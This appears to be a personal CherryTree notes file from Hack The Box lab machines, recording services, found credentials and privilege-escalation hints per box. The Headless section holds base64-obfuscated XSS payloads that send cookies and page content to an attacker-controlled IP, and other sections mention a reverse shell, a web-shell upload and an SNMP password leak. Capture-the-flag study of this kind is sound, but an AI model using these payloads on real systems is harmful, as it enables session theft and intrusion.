<?xml version="1.0" encoding="UTF-8"?>
<cherrytree>
  <node unique_id="4" master_id="0" name="Easy" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="212" is_bold="0" foreground="" ts_creation="1739539367" ts_lastsave="1742748685">
    <rich_text scale="h1">Keeper</rich_text>
    <rich_text>

Ubuntu 3ubuntu0.3

</rich_text>
    <rich_text scale="h2">Web</rich_text>
    <rich_text>
- nginx 1.18.0
- keeper.htb
   → Link
- tickets.keeper.htb
   → Request Tracker 4.4.4+dfsg-2ubuntu1 (exploits): 
      ⇒ Opensource: </rich_text>
    <rich_text link="webs https://github.com/bestpractical/rt/tree/4.4/fix-unconditional-lastupdated">https://github.com/bestpractical/rt/tree/4.4/fix-unconditional-lastupdated</rich_text>
    <rich_text>
   → Login (Default: root password)

</rich_text>
    <rich_text scale="h2">Users</rich_text>
    <rich_text>
- </rich_text>
    <rich_text link="webs http://tickets.keeper.htb/rt/Admin/Users/Modify.html?id=27">lnorgaard</rich_text>
    <rich_text> Lise NĂ¸rgaard - has a dump in her home directory
- root Enoch Root
- Password was stored in search -&gt; Users -&gt; lnorgaard -&gt; Welcome2023!

</rich_text>
    <rich_text scale="h2">ssh</rich_text>
    <rich_text>
OpenSSH 8.9p1

</rich_text>
    <rich_text scale="h2">Privesc</rich_text>
    <rich_text>
there was a keepass dump, protected by password:
- Try cracking the keepass hash with john: keepass2john
- Exploit research on Keypass: Master Password Dumper
   → Get the result and google search to discover the missing char
- There was in a comment the PUTTY ssh file (ssh key for Windows) which can be converted in Linux ssh
   
</rich_text>
    <rich_text scale="h1">Titanic</rich_text>
    <rich_text>

</rich_text>
    <rich_text scale="h2">Web</rich_text>
    <rich_text>

Apache httpd 2.4.52
Flask 3.0.3

- titanic.htb
   → json file generated while booking
   → File inclusion
- dev.titanic.htb GitTea
   → developer@titanic.htb
   → docker-config
      ⇒ mysql 8.0 </rich_text>
    <rich_text family="monospace">127.0.0.1:3306</rich_text>
    <rich_text> with tickets database
      ⇒ Password: MySQLP@$$w0rd!
   → flask-app
      ⇒ Run on port </rich_text>
    <rich_text family="monospace">127.0.0.1:5000</rich_text>
    <rich_text>
      ⇒ /tickets is where tickets are stored 

File inclusion on config files of:
- ssh
- flask-app
- gitea
   → The folder is known: </rich_text>
    <rich_text family="monospace">/home/developer/gitea/data/FUZZ</rich_text>
    <rich_text>
      ⇒ gitea.db
      ⇒ app.ini
- docker

After getting the hash from gitea.db -&gt; google how to crack gitea hashes-&gt;25282528

</rich_text>
    <rich_text scale="h2">Privesc</rich_text>
    <rich_text>

In /opt there is a file that gets executed by root and calls /usr/bin/magick with a jpg
Check version of magick and exploit research with jpg input

</rich_text>
    <rich_text scale="h1">Antique</rich_text>
    <rich_text>

</rich_text>
    <rich_text scale="h2">snmp</rich_text>
    <rich_text>
v1, not bruteforceble
with public there is the string  </rich_text>
    <rich_text family="monospace">HTB Printer</rich_text>
    <rich_text>

</rich_text>
    <rich_text scale="h2">telnet</rich_text>
    <rich_text>
the string HP JetDirect appears when trying to connect and asks for a password
Exploit research of telnet + HP JetDirect:
</rich_text>
    <rich_text family="monospace">snmpwalk -v 2c -c public 10.10.10.251 .1.3.6.1.4.1.11.2.3.9.1.1.13.0</rich_text>
    <rich_text>
Convert from hex using cyberchef: </rich_text>
    <rich_text family="monospace">P@ssw0rd@123!!123</rich_text>
    <rich_text>

</rich_text>
    <rich_text scale="h2">Privesc</rich_text>
    <rich_text>
- We are in a telnet shitty shell -&gt; Upgrade using a rev shell: </rich_text>
    <rich_text family="monospace">exec bash -c “rev shell”</rich_text>
    <rich_text>
- </rich_text>
    <rich_text family="monospace">netstat -puntal</rich_text>
    <rich_text> -&gt; cups -&gt; version: 1.6 -&gt; Exploit research: arbitrary file read -&gt; /root/root.txt

</rich_text>
    <rich_text scale="h1">Soccer</rich_text>
    <rich_text>

</rich_text>
    <rich_text scale="h2">Web</rich_text>
    <rich_text>
- Bootstrap 4.1.1
- JQuery[3.2.1,3.6.0]
- nginx[1.18.0]

→ /tiny: tiny file manager -&gt; default password 
   ⇒ admin admin@123
   ⇒ user </rich_text>
    <rich_text style="italic">12345</rich_text>
    <rich_text>

Tiny File Manager 2.4.3: File upload in uploads folder (manually web shell)

</rich_text>
    <rich_text scale="h2">Lateral Move</rich_text>
    <rich_text>

Users: 
- www/data (me)
- player
- root

Files
- </rich_text>
    <rich_text link="file L3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZw==">/var/log/nginx/access.log</rich_text>
    <rich_text> IDK

New vhosts: doc-player

</rich_text>
    <rich_text scale="h2">Privesc</rich_text>
    <rich_text>
sudo doas is vulnerable: doas.conf

</rich_text>
    <rich_text scale="h1">Valentine</rich_text>
    <rich_text>

</rich_text>
    <rich_text scale="h2">Web</rich_text>
    <rich_text>

</rich_text>
    <rich_text scale="h3">Tech</rich_text>
    <rich_text>
-  Ubuntu
- Apache 2.2.22
- PHP 5.3.10-1
- SSL -&gt; nmap script -&gt; hearthbleed exploit -&gt; heartbleedbelievethehype

</rich_text>
    <rich_text scale="h3">F&amp;F</rich_text>
    <rich_text>
- /dev/
   → Note: Make sure encoding/decoding is only done client-side.
   → Hype Key -&gt; decode from hex: rsa private key
- /encode/ -&gt;rabbithole
   → /decode.php -&gt; Parameter text: 
      ⇒ OS command injection?
      ⇒ Reflected -&gt; template?
- /decode/ -&gt; rabbithole
   → /encode.php

</rich_text>
    <rich_text scale="h2">Privesc</rich_text>
    <rich_text>

history -&gt; tmux -&gt; </rich_text>
    <rich_text link="webs https://redfoxsec.com/blog/terminal-multiplexing-hijacking-tmux-sessions/">https://redfoxsec.com/blog/terminal-multiplexing-hijacking-tmux-sessions/</rich_text>
    <rich_text> -&gt; ignore the error

</rich_text>
    <rich_text scale="h1">Good Games</rich_text>
    <rich_text>

</rich_text>
    <rich_text scale="h2">Web</rich_text>
    <rich_text>

</rich_text>
    <rich_text scale="h3">tech</rich_text>
    <rich_text>
- Werkzeug httpd 2.0.2 (Python 3.9.2)
-  Flask 2.0.2

</rich_text>
    <rich_text scale="h1">Dog</rich_text>
    <rich_text>

</rich_text>
    <rich_text scale="h2">Web</rich_text>
    <rich_text>

</rich_text>
    <rich_text scale="h3">tech</rich_text>
    <rich_text>
- Apache[2.4.41]
- Backdrop 1

</rich_text>
    <rich_text scale="h3">Struct</rich_text>
    <rich_text>
- </rich_text>
    <rich_text link="webs http://10.10.11.58/?q=FUZZ">http://10.10.11.58/?q=FUZZ</rich_text>
    <rich_text>
- /core/ ?
- /profiles/
- /files/
- /.git/

</rich_text>
    <rich_text scale="h2">User</rich_text>
    <rich_text>
- dogBackDropSystem
- tiffany
- root
- rosa
- axel
- morris
- john
- jobert
- jPAdminB

</rich_text>
    <rich_text scale="h2">Pass</rich_text>
    <rich_text>
- BackDropJ2024DS2024

</rich_text>
    <rich_text scale="h2">Maybe Useful</rich_text>
    <rich_text>

protected $hostname = 'localhost';
core/modules/simpletest/tests/filetransfer.test-6-  protected $username = 'backdrop';
core/modules/simpletest/tests/filetransfer.test:7:  protected $password = 'password';
core/modules/simpletest/tests/filetransfer.test-8-  protected $port = '42';

</rich_text>
    <rich_text scale="h2">Privesc</rich_text>
    <rich_text>

johncusack:BackDropJ2024DS2024

</rich_text>
    <rich_text scale="h1">Headless</rich_text>
    <rich_text>

</rich_text>
    <rich_text scale="h2">SSH</rich_text>
    <rich_text>
openSSH 9.2p1 Debian

</rich_text>
    <rich_text scale="h2">Web 5000</rich_text>
    <rich_text>
Werkzeug httpd 2.2.2 
Python 3.11.2

</rich_text>
    <rich_text scale="h3">XSS</rich_text>
    <rich_text>
</rich_text>
    <rich_text justification="left" scale="h3" foreground="#e6e6e6">'"&gt;&lt;/script&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;</rich_text>
    <rich_text>&lt;svg/onload=eval(atob("eGhyPW5ldyBYTUxIdHRwUmVxdWVzdDt4aHIub3BlbigiR0VUIiwiaHR0cDovLzEwLjEwLjE0LjM6ODg4OC8iKTt4aHIuc2VuZCgpOw=="));&gt;
</rich_text>
    <rich_text justification="left" scale="h3" foreground="#e6e6e6">'"&gt;&lt;/script&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;</rich_text>
    <rich_text>&lt;svg/onload=eval(atob("eGhyPW5ldyBYTUxIdHRwUmVxdWVzdDt4aHIub3BlbigiR0VUIiwiaHR0cDovLzEwLjEwLjE0LjM6ODg4OC8/Yz0iK2J0b2EoZG9jdW1lbnQuY29va2llKSk7eGhyLnNlbmQoKTs="));&gt;

function b(){sr
=new XMLHttpRequest;sr.open("GET","</rich_text>
    <rich_text link="webs http://10.10.14.3:8888/?c">http://10.10.14.3:8888/?c</rich_text>
    <rich_text>"+btoa(this.responseText));sr.send();};xhr=new XMLHttpRequest;xhr.open("[METHOD]","[URL]");xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xhr.withCredentials=true;xhr.onload=b;xhr.send("application/x-www-form-urlencoded");

</rich_text>
    <rich_text scale="h2">Privesc</rich_text>
    <rich_text>
sudo -l -&gt; sudo binary
file ./initdb.sh in the code 
→ create a file with the same name and a shell

</rich_text>
    <rich_text scale="h1">Code</rich_text>
    <rich_text>

</rich_text>
    <rich_text scale="h2">Web 5000</rich_text>
    <rich_text>

- Gunicorn 20.0.4
- Jquery 3.6.0
- Ace 1.4.12

</rich_text>
    <rich_text scale="h2">Privesc</rich_text>
    <rich_text>
martin: nafeelswordsmaster</rich_text>
  </node>
</cherrytree>
